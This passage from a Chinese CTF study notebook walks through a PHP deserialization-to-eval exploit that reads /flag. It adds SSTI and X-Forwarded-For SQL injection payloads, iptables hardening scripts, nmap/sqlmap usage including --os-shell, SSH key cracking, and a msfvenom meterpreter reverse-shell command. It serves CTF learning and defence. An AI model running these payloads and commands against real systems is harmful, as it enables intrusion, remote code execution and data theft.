程序从客户端接收code变量，如果code变量不存在，则会生成一个Welcome类，并且打印**"你知道什么是robots协议吗?"**，在浏览器上，很明显我们一进网站看见的就是这东西！那我们待会记得code变量是在`index.php`页面进行提交的！

然后我们肯定要传一个code变量上去，所以不用看下面的代码：

```php
class Welcome{
    public $test;
    function __construct(){
        $this->test = new Aurora();
    }

    function __destruct(){
        $this->test->action();
    }
}

class cc{
    public $code;
    function __construct(){
        $this->code = "flag_is_here";
    }
    function action(){
        eval($this->code);
    }
}

class Aurora{
    function action(){
        echo "welcome to auroraCTF";
    }
}
```

上面是code变量反序列化，然后执行这些代码：

欸，我们发现class cc和class Aurora里面有同名的函数，并且cc里面的action有个eval函数，应该有命令执行！

我们进行构造：

首先先尝试提交读取phpinfo信息：

```php
<?php

class Welcome{
    public $test;
    
    function __construct(){
        $this->test = new cc();
        $this->test->code ="phpinfo()";
    }

    function __destruct(){
        $this->test->action();
    }
    
}

class cc{
    public $code;
    function __construct(){
        $this->code = "flag_is_here";
    }
    function action(){
        eval($this->code);
    }

}
echo serialize(new Welcome);

?>
```

生成代码的时候记得运行时候的，先把代码改成这样：（不要让生成序列化对象的时候运行phpinfo代码）后面加上 ；（分号）就可以了，记得改数字！！

```php
$this->test->code ="phpinfo()";
```

原本你生成的是：

```txt
O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:9:"phpinfo()";}}
```

**加个分号，改个数字：**

```txt
O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:10:"phpinfo();";}}
```

然后提交：

```html
/index.php?code=O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:10:"phpinfo();";}}
```

还真的出现了！！

[![IRMV58.png](https://z3.ax1x.com/2021/11/15/IRMV58.png)](https://imgtu.com/i/IRMV58)



那成，这样子的话只需要改 `$this->test->code ="xxxxx";`

只需要改几个命令就可以来读取操作了：

查看当前目录下文件：

```php
$this->test->code ="print_r(scandir('/var/www/html'));";
```

```php
/index.php?code=
O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:34:"print_r(scandir('/var/www/html'));";}}
```

[![IRl7vQ.png](https://z3.ax1x.com/2021/11/15/IRl7vQ.png)](https://imgtu.com/i/IRl7vQ)

很显然，没有发现有价值的文件！

然后：

读取根目录下的文件：

```php
/index.php?code=O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:23:" print_r(scandir('/'));";}}
```

[![IRQx6H.png](https://z3.ax1x.com/2021/11/15/IRQx6H.png)](https://imgtu.com/i/IRQx6H)

然后我们就看到了flag文件！！！开心，就快解完了！

进行最后一步的构造，读取/flag文件！！

```php
$this->test->code ="echo readfile('/flag');";
```

最终代码：

```php
<?php

class Welcome{
    public $test;
    
    function __construct(){
        $this->test = new cc();
        $this->test->code ="echo readfile('/flag');";
    }

    function __destruct(){
        $this->test->action();
    }
    
}

class cc{
    public $code;
    function __construct(){
        $this->code = "flag_is_here";
    }
    function action(){
        eval($this->code);
    }

}
echo serialize(new Welcome);

?>
```

提交payload：


```txt
/index.php?code=O:7:"Welcome":1:{s:4:"test";O:2:"cc":1:{s:4:"code";s:23:"echo readfile('/flag');";}}
```

[![IRlJc4.png](https://z3.ax1x.com/2021/11/15/IRlJc4.png)](https://imgtu.com/i/IRlJc4)

得到最终的flag：

```txt
flag{bba985f5-6e11-4afc-b85e-cf29e08268d5}
```







### 23.STTL

Django模板

```
url=@/opt/api/database.sqlite3 得到数据库内容
```

Tornado模板

```php
/error?msg={{handler.settings}}
```

handler.settings进行访问！！

### 

### 24.XFF注入攻击

HTTP请求头中的一个头部参数，用来识别客户端的IP，用于设定有一些只能本地访问的网站而言：

```http
X-Forwarded-For：127.0.0.1
```

判断注入点：

```http
X-Forwarded-For：127.0.0.1'
```

若是出现返回主体出错，则存在注入漏洞

可以用布尔注入进行尝试：

```http
X-Forwarded-For：127.0.0.1' and 1=1#
X-Forwarded-For：127.0.0.1' and 1=2#
```

```http
X-Forwarded-For：127.0.0.1' order by 1#
#测试字段数
```

```
X-Forwarded-For：127.0.0.1' union select 1,2,3,4#
```

使用union注入

## 五.靶机防护

### 01.防火墙设置

#### 1.Iptables命令

##### ① 用法

```shell
iptables -[ACD] chain rule-specification [options]
iptables -I chain [rulenum] rule-specification [options]
iptables -R chain rulenum rule-specification [options]
iptables -D chain rulenum [options]
iptables -[LS] [chain [rulenum]] [options]
iptables -[FZ] [chain] [options]
iptables -[NX] chain
iptables -E old-chain-name new-chain-name
iptables -P chain target [options]
iptables -h (print this help information)
```

##### ② 属性

```shell
Commands:
Either long or short options are allowed.
  --append  -A chain            Append to chain
  --check   -C chain            Check for the existence of a rule
  --delete  -D chain            Delete matching rule from chain
  --delete  -D chain rulenum
                                Delete rule rulenum (1 = first) from chain
  --insert  -I chain [rulenum]
                                Insert in chain as rulenum (default 1=first)
  --replace -R chain rulenum
                                Replace rule rulenum (1 = first) in chain
  --list    -L [chain [rulenum]]
                                List the rules in a chain or all chains
  --list-rules -S [chain [rulenum]]
                                Print the rules in a chain or all chains
  --flush   -F [chain]          Delete all rules in  chain or all chains
  --zero    -Z [chain [rulenum]]
                                Zero counters in chain or all chains
  --new     -N chain            Create a new user-defined chain
  --delete-chain
             -X [chain]         Delete a user-defined chain
  --policy  -P chain target
                                Change policy on chain to target
  --rename-chain
             -E old-chain new-chain
                                Change chain name, (moving any references)

```

##### ③ 选项

```shell
Options:
    --ipv4      -4              Nothing (line is ignored by ip6tables-restore)
    --ipv6      -6              Error (line is ignored by iptables-restore)
[!] --proto     -p proto        protocol: by number or name, eg. `tcp'
[!] --source    -s address[/mask][...]
                                source specification
[!] --destination -d address[/mask][...]
                                destination specification
[!] --in-interface -i input name[+]
                                network interface name ([+] for wildcard)
 --jump -j target
                                target for rule (may load target extension)
  --goto      -g chain
                               jump to chain with no return
  --match       -m match
                                extended match (may load extension)
  --numeric     -n              numeric output of addresses and ports
[!] --out-interface -o output name[+]
                                network interface name ([+] for wildcard)
  --table       -t table        table to manipulate (default: `filter')
  --verbose     -v              verbose mode
  --wait        -w [seconds]    maximum wait to acquire xtables lock before give up
  --wait-interval -W [usecs]    wait time to try to acquire xtables lock
                                default is 1 second
  --line-numbers                print line numbers when listing
  --exact       -x              expand numbers (display exact values)
[!] --fragment  -f              match second or further fragments only
  --modprobe=<command>          try to insert modules using this command
  --set-counters PKTS BYTES     set the counter during insert/append
[!] --version   -V              print package version.

```

##### ④ 案例

shell script脚本一键设置普通firewall。

```shell
#!/bin/bash
#Allow youself Ping other hosts , prohibit others Ping you
#允许你去ping别的主机，但是禁止其他人去ping你。
iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP
iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT
#Close all INPUT FORWARD OUTPUT, just open some ports
#先丢弃掉所有的端口进来的数据包，做一个初始化，仅仅开放一些端口
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP
#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
#Open multiport
#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT
#Control IP connection
#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT
#A single IP allows up to 15 new connections in 60 seconds
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT
#Prevent port reuse
iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT
#Filter abnormal packets
iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP 
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP
#Prevent DoS attacks
iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT
#Discard unfamiliar TCP response packs to prevent rebound attacks
iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP
iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP
```

#### 2.特定脚本：

##### 1.关闭所有端口，只开放一些必要的端口

```shell
#开放ssh
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
#打开80端口
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
#开启多端口简单用法
iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT
#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话
iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT
```

##### 2.限制ssh登录，进行访问控制

```shell
iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机
iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh
```

##### 3.限制IP连接数和连接速率

```shell
#单个IP的最大连接数为 30
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT
#单个IP在60秒内只允许最多新建15个连接
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT
iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT
#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）
iptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT
```

##### 4.数据包简单识别，防止端口复用类的后门或者shell

```shell
iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP
```

##### 5.限制访问

```shell
iptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务
#封杀123.4.5.6这个IP或者某个ip段
iptables -I INPUT -s 123.4.5.6 -j DROP
iptables -I INPUT -s 123.4.5.1/24 -j DROP
```

##### 6.过滤异常报文

```shell
iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识
iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 #匹配SYN标识位
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 #检查所有的标识位，匹配到FIN URG PSH的丢弃
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 #丢弃没标志位的包
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　#匹配到SYN ACK FIN URG的丢弃
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　#匹配到SYN ACK FIN RST的丢弃
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP　　　　　　#匹配到SYN FIN PSH的丢弃
iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP　 　　#匹配到SYN FIN RST PSH的丢弃
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP　　　　　　#匹配到 SYN,RST的丢弃
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP 　　　　　 #匹配到 SYN,FIN的丢弃
```

##### 7.防DDOS攻击

```shell
iptables -A INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-burst 100 -j ACCEPT
　　-m limit: 启用limit扩展
　　–limit 20/minute: 允许最多每分钟10个连接
　　–limit-burst 100: 当达到100个连接后，才启用上述20/minute限制
```

#### 3.命令关注：

```shell
ssh <-p 端口> 用户名@IP　　
scp 文件路径  用户名@IP:存放路径　　　　
tar -zcvf web.tar.gz /var/www/html/　　
w 　　　　
pkill -kill -t <用户tty>　　 　　
ps aux | grep pid或者进程名　　　　
#查看已建立的网络连接及进程
netstat -antulp | grep EST
#查看指定端口被哪个进程占用
lsof -i:端口号 或者 netstat -tunlp|grep 端口号
#结束进程命令
kill PID
killall <进程名>　　
kill - <PID>　　
#封杀某个IP或者ip段，如：.　　
iptables -I INPUT -s . -j DROP
iptables -I INPUT -s ./ -j DROP
#禁止从某个主机ssh远程访问登陆到本机，如123..　　
iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　
#备份mysql数据库
mysqldump -u 用户名 -p 密码 数据库名 > back.sql　　　　
mysqldump --all-databases > bak.sql　　　　　　
#还原mysql数据库
mysql -u 用户名 -p 密码 数据库名 < bak.sql　　
find / *.php -perm  　　 　　
awk -F:  /etc/passwd　　　　
crontab -l　　　　
#检测所有的tcp连接数量及状态
netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn
#查看页面访问排名前十的IP
cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　
#查看页面访问排名前十的URL
cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -　　
```

文件命令：

```
lsattr
#查看隐藏属性
chattr +i
#修改文件隐藏属性，不能对文件进行修改
chattr -i
#取消隐藏，换为可以修改
```



#### 4.DDos攻击

##### ① DRDos攻击

DRDoS（分布式反射攻击）

**原理：**

黑客伪造成受害者的IP地址，向互联网上大量开放特定服务的主机发起请求，接收到请求的那些主机根据源IP地址将响应数据包返回给受害者。

整个过程中，大量的无辜主机完全不知情，成为黑客攻击的帮凶。一般来说，黑客会使用响应包远大于请求包的服务来利用，这样才可以以较小的流量换取交大的流量去攻击，几十倍的放大攻击。

能利用来做放大反射攻击的服务，常见的有DNS服务、NTP服务、SNMP服务、Chargen服务等等，甚至某些online游戏服务器也被利用来参与攻击。

Chargen是一个常见的测试网络连通性服务，同时工作在UDP协议和TCP协议上。对于它监听的TCP端口，只要有客户端连上，就会源源不断的向客户端返回随机字符串，永不停止。

##### ② 基于UDP的反射攻击：

使用NTP服务进行流量放大，效率非常高。

只需要较小的请求流量来换取巨大的攻击流量

##### ③ 基于TCP的反射攻击：

**特征**：

- 容易伪造源IP地址
- 无身份认证
- 相应包远远大于请求包

事实上，基于UDP的DNS协议、NTP协议、Chargen协议、SNMP协议成为攻击的首要选择。

##### ④ DRDos的防御：

- TCP的反射攻击有可能发生，但是发起难度较大，危害远远不如UDP。

- 把关注点放在UDP的反射放大攻击。
- 可以在底层解决的事情，解析过滤的事情不要在更高层做，越往上，解析开销越大。

##### ⑤ SYN Flood防御

**SYN Cookie、SYN Proxy**

- SYN Cookie

将源IP、目的IP、源端口、目的端口、SYN序列号等信息进行hash运算，生成一个数字称之为cookie。

服务端将这个cookie作为SYN+ACK包的ACK确认号发送给客户端，然后对这个IP发过来的后续ACK包的确认号进行验算，与Cookie吻合的说明是正确的报文，正常建立连接，而攻击的报文直接没有了任何后续动作，也没有额外开销。

- SYN Proxy

管家式的防御，它站在攻击者和目标服务器之间，伪装成目标服务器对所有的SYN报文进行应答，包括攻击者在内。当三次握手正确的建立起来后，就伪装成客户端IP地址与后端的目标服务器建立三次握手，然后转发数据，需要注意的是，TCP三次握手在这里变成了6次握手，而且两个握手内的ACK号肯定不一致，需要做一个修正。

- 随即丢包

答复之前做一些随机丢弃SYN包进行测试，按照TCP协议，正常的用户将会在3秒内重发这个SYN包，攻击流量的源IP是伪造的，因此直接被丢弃之后便没有任何后续了！

但是会导致一旦同样SYN包发两次就可能绕过防御，并且会导致用户的体验感变差，访问业务变慢。

- 反向探测

防御设备接收到SYN包时，回复一个ACK确认号错误的SYN+ACK报文。按照协议，客户端会发一个RST报文过来重置连接。攻击者一般是伪造源IP地址，没有人会帮他做这个应答，SYN包被直接过滤掉。

### 02.服务器安全与防护

#### 1.攻击

##### ① 外部攻击

###### Ⅰ 网络层面（DDOS、远程登录暴力破解等）

###### Ⅱ 主机层面（提权攻击、病毒等）

###### Ⅲ 应用层面（WEB攻击、FTP攻击等）

##### ② 内部威胁

###### Ⅰ 人员内控

###### Ⅱ 网络、系统、软件自身漏洞

#### 2.

#### 3.



## 六.靶机攻击

Windows循环ping当前网段下的存活主机：

```bash
for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.1.%i
```



### 01.SSH漏洞提权

还是遵循扫描-->寻找-->扫描-->尝试的方法：

1. 扫描：

扫描我们采用nmap以及nikto来进行扫描：

- 首先是nmap扫描：

  ```shell
  nmap -p- -T4 ip
  //查看对应ip开放的端口号
  nmap -sV ip
  //扫描同网段的ip
  nmap -A -v ip
  //查看全部信息
  nmap -o ip
  //查看操作系统类型与版本
  ```

- 扫描得到结果后进行分析，看一下对应主机开放了什么端口，然后要注意==大端口==对应的服务。常用端口==0~1023==，主要是找特殊端口为先，同时也不要放过80端口。

- 对于某个端口的详细信息，我们可以用nikto来进行扫描分析：

  ```shel
  nikto -host http://ip:port
  //仅使用于http服务的端口
  ```

- 然后我们使用dirb来进行隐藏文件或链接的搜索：

  ```shell
  dirb http://ip:port
  //通常都可以在这里面找到一些关键信息！
  //如果可以找到robot.txt文件，那么你成功几率就会增加！
  //因为robot.txt里面放着规定搜索引擎哪个可以搜索，哪个不可以搜索！
  //要是有.ssh文件，那么下载，查看私钥和公钥，进行下一步探测！
  ```

- 大端口非http服务，我们可以用nc来探测banner信息，然后通过banner信息来寻找关键文件：

  ```shell
  nc ip port
  //就这样子！
  ```

- 对于大端口的http服务，可以使用浏览器等查看源代码，分析http报文来进一步分析：

- 值得注意的是，在分析端口时如果开放了ftp，可以采用ftp匿名登录，查看敏感信息：

  ```shell
  ftp://ip
  //匿名登录
  ```

- 如果拿到私钥和公钥的话，使用ssh2john将密钥信息解密，再用zcat解密：

  ```shell
  ssh2john 密钥.txt > 新名字.txt
  //查看解密
  zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules 新名字.txt
  //解压缩你的字典包，当然存放位置可能有所差异，不过也差不多得了！
  //一般来说，id_rsa就是你的私钥；id_rsa.pub就是你的公钥
  ```

- 尝试使用私钥文件登录，先将文件进行提权操作

  ```shell
  chmod 777 新名字.txt
  //一劳永逸
  ssh -i 文件名
  //出现私钥，用户名与主机名
  ssh -i 私钥文件名 用户名@ip
  //进行尝试登录
  ```

- 如果登陆成功就去找root文件，进行提权操作：

  ```shell
  find / -perm -4000 2>/dev/null
  //进行操作文件查找，并将错误操作丢进黑洞里
  ```

- 然后进行代码审计，再来看它的后续题目设置！

### 02.SQLmap使用

通过构建特殊的输入作为参数传入web应用程序SQL语句

漏洞扫描

OWASP ZAP扫描web

点进去说明端口号

然后使用sqlmap

Sqlmap -u url -dbs 查看数据库名

Sqlmap -u url -D 数据库名 -tables 查看数据表

Sqlmap -u url -D 数据库名 -T 表名 -columns 查看对应字段

Sqlmap -u url -D 数据库名 -T 表名 -C 列名 -dump 查看对应字段值

也可以尝试直接sqlmap -u url -os-shell 直接获取shell

 

sqlmap -u "网址" --identify-waf --batch

查看该网站的WAF情况







上传shell反弹权限

Msf

Msfvenom -p php/meterpreter/reverse_tcp lhost=自己ip lport=自己任意一个无用端口



### 03.伪造IP访问：

```python
import requests
import random

for a in range(256):
    ip = '%d.0.0.0' % a
    headers = {'X-Forwarded-For': ip}
    r = requests.post('http://202.38.93.111:10888/invite/xxx', data={'ip': ip}, headers=headers)
    print(r.text)
```

### 04.Nmap的常见用法：

扫描单个目标地址：

```bash
nmap ip
```

扫描多个目标地址：

```bash
nmap ip1 ip2 
```

扫描一个范围内的目标地址：

```bash
nmap 192.168.0.100-110
```

中间用 `-` 隔开，表示范围

扫描目标地址所在的某个网段：

```bash
nmap ip/24
#表示由xxx.xxx.xxx.1 ~ xxx.xxx.xxx.255
```

扫描文件内的所有IP地址

```bash
nmap -iL <文件位置>
```

扫描除某个目标地址之外的所有目标地址

```bash
nmap ip/24 -exclude ipx
```

扫描某一个目标地址的特定端口

```bash
nmap ip -p 21,22,23,80
```

之间以`,`隔开

对目标地址进行路由跟踪：

```bash
nmap --traceroute ip
```

扫描存活主机

```bash
nmap -sP ip/24
```

**对目标地址的操作进行指纹识别（系统）**

```bash
nmap -O ip
```

**对目标地址提供的服务版本检测（探测开放端口）**

```bash
nmap -sV ip
```

**探测防火墙状态：**

```bash
nmap -sF -T4 ip
```

**完整Nmap扫描：**

```bash
nmap -T4 -A -v ip
```

**常见的Nmap端口状态及其含义**：

|      状态       |                             含义                             |
| :-------------: | :----------------------------------------------------------: |
|      open       |    开放的，表示应用程序正在监听该端口的连接，外部可以访问    |
|    filtered     |    被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问    |
|     closed      |              关闭的的，表示目标主机未开启该端口              |
|   unfiltered    | 未被过滤的，表示Nmap无法确定端口所处状态，需要进行下一步探测 |
|  open/filtered  |                开放的或被过滤的，Nmap不能识别                |
| closed/filtered |                关闭的或被过滤的，Nmap不能识别                |



## 七.Windows专区

### 01.PowerShell技术

PowerShell脚本文件，`.psl`，可以直接在内存中运行，Windows 7 以上操作系统默认安装

`Win+R`输入powershell 就可以到达powershell界面，

```powershell
Get-Host
```

查看PowerShell版本

或者直接单单查看版本号：

```powershell
$PSVersionTable.PSVERSION
```

[![IsI79O.png](https://z3.ax1x.com/2021/11/13/IsI79O.png)](https://imgtu.com/i/IsI79O)





#### 1.PowerSploit

PowerShell后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。

#### 2.Nishang

基于PowerShell的渗透测试专用工具，及撤出那个了框架、脚本和各种Payload，包含下载和执行、键盘记录、DNS、延时命令等。

#### 3.Empire

基于PowerShell的远程控制木马，可以从凭证数据库中到处和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭证窃取、持久化控制。

#### 4.PowerCat

PowerShell的NetCat，瑞士军刀，通过TCP和UDP在网络中读写数据，可以与其他工具结合以及重定向。

## 八.练习专区





### pikachu

#### 1.暴力破解

暴力破解，顾名思义就是使用大量的认证信息在认证接口进行尝试登录，实质上是一种跑字典的行为，只要给足计算能力是时间，大多数系统都是可以被破解的：

防范措施：

- 是否要求用户设置复杂的密码；
- 是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
- 是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
- 是否采用了双因素认证；

#### 2.XSS

#### 3.CSRF

#### 4.SQL注入

#### 5.RCE

#### 6.文件包含

#### 7.文件下载

#### 8.文件上传

#### 9.提权

#### 10.目录遍历

#### 11.敏感信息

#### 12.PHP反序列化

#### 13.XXE

#### 14.URL重定向

#### 15.SSRF



### sqli-labs

#### 基于从服务器接受到的响应

##### 基于错误的SQL注入

##### 联合查询的类型

##### 堆查询注射

##### SQL盲注

###### 基于布尔的SQL盲注

###### 基于时间的SQL盲注

###### 基于报错的SQL盲注

#### 基于如何处理输入的SQL查询（数据类型）

##### 基于字符串

##### 数字或整数为基础的

#### 基于程度和顺序的注入

##### 一阶注射

##### 二阶注射

##### 通过用户输入的表单域的注射

##### 通过cookie注射

##### 通过服务器变量注射（基于头部信息得到注射）

###### 
